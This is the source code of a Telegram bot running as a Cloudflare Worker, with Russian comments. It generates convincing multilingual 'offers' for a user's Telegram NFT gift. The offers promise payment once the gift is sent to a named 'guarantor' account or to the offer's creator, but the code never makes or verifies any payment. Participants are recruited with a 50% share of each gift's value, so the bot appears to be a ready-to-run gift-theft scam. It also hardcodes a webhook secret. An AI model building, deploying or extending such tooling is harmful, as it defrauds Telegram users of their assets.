const ADMIN_ID_1 = 5151757168; 
const ADMIN_ID_2 = 7423713851; 
const WEBHOOK_SECRET = "GarisOffer9231998"; 
const RELAYER_USERNAME = "GarisOffer_Relayer"; 

export default {
  async fetch(request, env, ctx) {
    const BOT_TOKEN = env.BOT_TOKEN; 
    const kv = env.USERS_KV; 

    if (!BOT_TOKEN) return new Response("Bot token is not configured", { status: 500 });

    const secretHeader = request.headers.get("X-Telegram-Bot-Api-Secret-Token");
    if (secretHeader !== WEBHOOK_SECRET) return new Response("Forbidden", { status: 403 });

    if (request.method !== "POST") return new Response("OK", { status: 200 });

    try {
      const update = await request.json();

      // ==========================================
      // ПРОВЕРКА ДОСТУПА (ОБЫЧНЫЙ И VIP)
      // ==========================================
      async function checkAccess(userId, username) {
          if (userId === ADMIN_ID_1 || userId === ADMIN_ID_2) return { access: true, isVip: true }; 
          if (!kv) return { access: false, isVip: false }; 
          
          const vipById = await kv.get(`vip_id:${userId}`);
          if (vipById) return { access: true, isVip: true };
          if (username) {
              const vipByName = await kv.get(`vip_username:${username.toLowerCase()}`);
              if (vipByName) return { access: true, isVip: true };
          }

          const byId = await kv.get(`allowed_id:${userId}`);
          if (byId) return { access: true, isVip: false };
          if (username) {
              const byName = await kv.get(`allowed_username:${username.toLowerCase()}`);
              if (byName) return { access: true, isVip: false };
          }
          
          return { access: false, isVip: false };
      }

      // ==========================================
      // КОМАНДА /addme (САМОДОБАВЛЕНИЕ)
      // ==========================================
      if (update.message && update.message.text.startsWith("/addme")) {
        const chatId = update.message.chat.id;
        const userId = update.message.from.id;
        const username = update.message.from.username || "";

        if (!kv) {
            await callApi("sendMessage", { chat_id: chatId, text: "❌ База данных не подключена." }, BOT_TOKEN);
            return new Response("OK", { status: 200 });
        }

        await kv.put(`allowed_id:${userId}`, "true");
        if (username) await kv.put(`allowed_username:${username.toLowerCase()}`, "true");

        await callApi("sendMessage", { 
            chat_id: chatId, 
            text: `✅ <b>Доступ открыт!</b>\n\nТеперь вы можете создавать офферы. Подарки по вашим офферам будут отправляться гаранту <a href="https://t.me/${RELAYER_USERNAME}">@${RELAYER_USERNAME}</a>.\n\n💰 <b>Вы будете получать 50% от стоимости подарка.</b>`, 
            parse_mode: "HTML" 
        }, BOT_TOKEN);
        return new Response("OK", { status: 200 });
      }

      // ==========================================
      // КОМАНДЫ /add, /remove И /remove all (ТОЛЬКО ДЛЯ АДМИНА)
      // ==========================================
      if (update.message && (update.message.text.startsWith("/add ") || update.message.text.startsWith("/remove "))) {
        const senderId = update.message.from.id;
        
        if (senderId !== ADMIN_ID_1 && senderId !== ADMIN_ID_2) {
            await callApi("sendMessage", { chat_id: update.message.chat.id, text: "⛔ У вас нет прав на эту команду." }, BOT_TOKEN);
            return new Response("OK", { status: 200 });
        }

        if (!kv) return new Response("OK", { status: 200 });

        const args = update.message.text.split(" ");
        const command = args[0]; 
        const targetUser = args[1]; 

        if (!targetUser) {
            await callApi("sendMessage", { chat_id: update.message.chat.id, text: "⚠️ Укажите ID или @username.", parse_mode: "HTML" }, BOT_TOKEN);
            return new Response("OK", { status: 200 });
        }

        // ИСПРАВЛЕННАЯ КОМАНДА /remove all
        if (command === "/remove" && targetUser.toLowerCase() === "all") {
            try {
                let cursor = undefined;
                let keysToDelete = [];
                for (let i = 0; i < 3; i++) {
                    cursor = undefined;
                    do {
                        const list = await kv.list({ cursor });
                        for (const key of list.keys) {
                            if (key.name.startsWith("allowed_") || key.name.startsWith("vip_")) {
                                if (key.name === `allowed_id:${ADMIN_ID_1}` || key.name === `allowed_id:${ADMIN_ID_2}`) continue;
                                if (key.name === `vip_id:${ADMIN_ID_1}` || key.name === `vip_id:${ADMIN_ID_2}`) continue;
                                keysToDelete.push(key.name);
                            }
                        }
                        cursor = list.cursor;
                    } while (cursor);
                }
                keysToDelete = [...new Set(keysToDelete)];
                for (const key of keysToDelete) await kv.delete(key);
                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `🗑 <b>Все списки доступа очищены!</b>\nУдалено записей: ${keysToDelete.length}.\n\n👑 Главные админы сохранены.`, parse_mode: "HTML" }, BOT_TOKEN);
            } catch (err) {
                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `❌ Ошибка: ${err.message}` }, BOT_TOKEN);
            }
            return new Response("OK", { status: 200 });
        }

        if (command === "/add") {
            if (targetUser.startsWith("@")) {
                const uname = targetUser.slice(1).toLowerCase();
                await kv.put(`vip_username:${uname}`, "true");
                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `✅ VIP-доступ для <b>@${uname}</b> выдан (подарки будут лететь ему).` , parse_mode: "HTML"}, BOT_TOKEN);
            } else {
                await kv.put(`vip_id:${targetUser}`, "true");
                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `✅ VIP-доступ для ID <code>${targetUser}</code> выдан.`, parse_mode: "HTML" }, BOT_TOKEN);
            }
        } 
        else if (command === "/remove") {
            if (targetUser.startsWith("@")) {
                const uname = targetUser.slice(1).toLowerCase();
                await kv.delete(`vip_username:${uname}`);
                await kv.delete(`allowed_username:${uname}`);
                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `🗑 Пользователь <b>@${uname}</b> удален.`, parse_mode: "HTML" }, BOT_TOKEN);
            } else {
                await kv.delete(`vip_id:${targetUser}`);
                await kv.delete(`allowed_id:${targetUser}`);
                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `🗑 Пользователь с ID <code>${targetUser}</code> удален.`, parse_mode: "HTML" }, BOT_TOKEN);
            }
        }
        return new Response("OK", { status: 200 });
      }

      // --- /start ---
      if (update.message && update.message.text === "/start") {
        const chatId = update.message.chat.id;
        const userId = update.message.from.id;
        const username = update.message.from.username || "";

        if (kv) await kv.put(`user:${userId}`, username || "no_username");

        const hasAccess = await checkAccess(userId, username);

        let text = "";
        if (!hasAccess.access) {
            text = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\nЧтобы получить доступ к созданию офферов, напишите команду:\n<code>/addme</code>`;
        } else if (hasAccess.isVip) {
            text = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>У вас VIP-доступ!</b>\n\nВы можете создавать офферы, и подарки будут приходить лично вам.\n\n💰`;
        } else {
            text = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Доступ открыт</b> (обычный).\n\nВы можете создавать офферы, но все подарки будут отправляться гаранту <a href="https://t.me/${RELAYER_USERNAME}">@${RELAYER_USERNAME}</a>.\n\n💰 <b>Вы будете получать 50% от стоимости подарка.</b>`;
        }

        await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" }, BOT_TOKEN);
      }

      // --- INLINE-ЗАПРОСЫ ---
      if (update.inline_query) {
        const iq = update.inline_query;
        const userId = iq.from.id;
        const username = iq.from.username || "";

        if (kv) await kv.put(`user:${userId}`, username || "no_username");

        const hasAccess = await checkAccess(userId, username);
        if (!hasAccess.access) return new Response("OK", { status: 200 });

        let textQuery = iq.query.replace(/[\u00A0\u200B\u202F]/g, ' ').replace(/https?:\/\//gi, '').trim().toLowerCase(); 
        
        let lang = "ru";
        if (textQuery.includes("eng") || textQuery.includes("en ")) { lang = "en"; textQuery = textQuery.replace(/eng/g, '').trim(); }
        else if (textQuery.includes("cn") || textQuery.includes("中文")) { lang = "cn"; textQuery = textQuery.replace(/cn/g, '').trim(); }

        const allNums = textQuery.match(/\d+/g); 
        const amount = allNums ? allNums[allNums.length - 1] : "0"; 
        
        const giftMatch = textQuery.match(/(?:https?:\/\/)?(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/i); 
        let giftLink = "";
        if (giftMatch) {
            let rawGift = giftMatch[0].replace(/^https?:\/\//, '');
            giftLink = rawGift.startsWith("t.me") ? "https://" + rawGift : "https://t.me/nft/" + rawGift;
        }

        let currencyType = "stars";
        let currencyDisplay = "⭐ Stars";
        if (textQuery.includes("gram") || textQuery.includes("ton")) { currencyType = "gram"; currencyDisplay = "💎 Gram"; } 
        else if (textQuery.includes("rub") || textQuery.includes("руб")) { currencyType = "rub"; currencyDisplay = "₽ Rub"; }

        let senderName = iq.from.first_name || "";
        if (iq.from.last_name) senderName += " " + iq.from.last_name;
        if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
        
        const targetReceiver = hasAccess.isVip ? (iq.from.username || "gwrex") : RELAYER_USERNAME;

        let text = "";
        let btnAccept = "Принять";
        let btnDecline = "Отклонить";
        let titleText = "";

        if (lang === "en") {
            text = `<b>Offer for your gift</b>\n\nYou are offered <b>${amount} ${currencyDisplay}</b>\n${giftLink}\n\nTo receive payment, send the gift to <a href="https://t.me/${targetReceiver}">@${targetReceiver}</a>.`;
            btnAccept = "Accept";
            btnDecline = "Decline";
            titleText = `Offer: ${amount} ${currencyDisplay}`;
        } else if (lang === "cn") {
            text = `<b>针对您礼物的报价</b>\n\n有人为您提供 <b>${amount} ${currencyDisplay}</b>\n${giftLink}\n\n要获得付款，请将礼物发送给 <a href="https://t.me/${targetReceiver}">@${targetReceiver}</a>。`;
            btnAccept = "接受";
            btnDecline = "拒绝";
            titleText = `报价: ${amount} ${currencyDisplay}`;
        } else {
            text = `<b>Оффер на ваш подарок</b>\n\nВам предлагают <b>${amount} ${currencyDisplay}</b>\n${giftLink}\n\nЧтобы получить оплату, передайте подарок <a href="https://t.me/${targetReceiver}">@${targetReceiver}</a>.`;
            btnAccept = "Принять";
            btnDecline = "Отклонить";
            titleText = `Оффер: ${amount} ${currencyDisplay}`;
        }

        const offerId = Math.random().toString(36).substring(2, 10);
        if (kv) {
            await kv.put(`offer:${offerId}`, JSON.stringify({ amount, currencyType, giftLink, lang, senderName, targetReceiver }), { expirationTtl: 86400 });
        }

        const results = [{
          type: "article", id: "1",
          title: titleText,
          description: `${amount} ${currencyDisplay}`,
          input_message_content: { message_text: text, parse_mode: "HTML" },
          reply_markup: { inline_keyboard: [
              [{ text: btnAccept, callback_data: `acc|${offerId}` }],
              [{ text: btnDecline, callback_data: `dec|${offerId}` }]
          ] }
        }];

        await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 }, BOT_TOKEN);
      }

      // --- КНОПКИ ---
      if (update.callback_query) {
        const cq = update.callback_query;
        
        if (cq.data.startsWith("acc") || cq.data.startsWith("dec")) {
          const dataParts = cq.data.split("|");
          const action = dataParts[0];
          const offerId = dataParts[1];
          
          if (!offerId) return new Response("OK", { status: 200 });

          let offer = { amount: "0", currencyType: "stars", giftLink: "", lang: "ru", senderName: "", targetReceiver: RELAYER_USERNAME };
          if (kv) {
              const saved = await kv.get(`offer:${offerId}`);
              if (saved) offer = JSON.parse(saved);
          }

          const amount = offer.amount;
          const currencyType = offer.currencyType;
          const lang = offer.lang;
          const targetReceiver = offer.targetReceiver || RELAYER_USERNAME;
          
          let displayCurrency = "⭐ Stars";
          if (currencyType === "gram") displayCurrency = "💎 Gram";
          if (currencyType === "rub") displayCurrency = "₽ Rub";

          const buyer = cq.from;
          let buyerName = buyer.first_name || "";
          if (buyer.last_name) buyerName += " " + buyer.last_name;

          let newText = "";
          let newMarkup = { inline_keyboard: [] };

          if (action === "acc") {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: lang === "en" ? `Offer accepted ✅\n\nSend gift to @${targetReceiver}` : `Оффер принят ✅\n\nПередайте подарок @${targetReceiver}`, show_alert: true }, BOT_TOKEN);
            
            const finalUrl = "https://t.me/" + targetReceiver;

            if (lang === "en") {
                newText = `✅ <b>Offer accepted!</b>\n\nBuyer: <b>${buyerName}</b>\n\n${amount} ${displayCurrency} will be credited after the gift is transferred to <a href="https://t.me/${targetReceiver}">@${targetReceiver}</a>.`;
                newMarkup = { inline_keyboard: [[{ text: "Send Gift", url: finalUrl }]] };
            } else if (lang === "cn") {
                newText = `✅ <b>报价已接受！</b>\n\n买家：<b>${buyerName}</b>\n\n${amount} ${displayCurrency} 将在礼物转移给 <a href="https://t.me/${targetReceiver}">@${targetReceiver}</a> 后记入。`;
                newMarkup = { inline_keyboard: [[{ text: "发送礼物", url: finalUrl }]] };
            } else {
                newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\n${amount} ${displayCurrency} будут зачислены после того, как подарок будет передан <a href="https://t.me/${targetReceiver}">@${targetReceiver}</a>.`;
                newMarkup = { inline_keyboard: [[{ text: "Передать подарок", url: finalUrl }]] };
            }
          } else {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
            newText = lang === "en" ? `❌ <b>You declined the offer.</b>` : `❌ <b>Вы отказались от оффера.</b>`;
          }

          if (cq.inline_message_id) {
            try {
              if (cq.message && cq.message.caption !== undefined) {
                await callApi("editMessageCaption", { inline_message_id: cq.inline_message_id, caption: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
              } else {
                await callApi("editMessageText", { inline_message_id: cq.inline_message_id, text: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
              }
            } catch (err) {}
          } else if (cq.message) {
            const chatId = cq.message.chat.id;
            const messageId = cq.message.message_id;
            try {
              await callApi("sendMessage", { chat_id: chatId, text: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
              try { await callApi("deleteMessage", { chat_id: chatId, message_id: messageId }, BOT_TOKEN); } catch (e) {}
            } catch (err) {}
          }
        }
      }

      return new Response("OK", { status: 200 });
    } catch (error) {
      console.error("КРИТИЧЕСКАЯ ОШИБКА:", error.message);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};

async function callApi(method, body, token) {
  const url = `https://api.telegram.org/bot${token}/${method}`;
  try {
    const response = await fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
    const data = await response.json();
    if (!data.ok) throw new Error(data.description);
    return data;
  } catch (e) { console.error(`Ошибка API [${method}]:`, e.message); throw e; }
}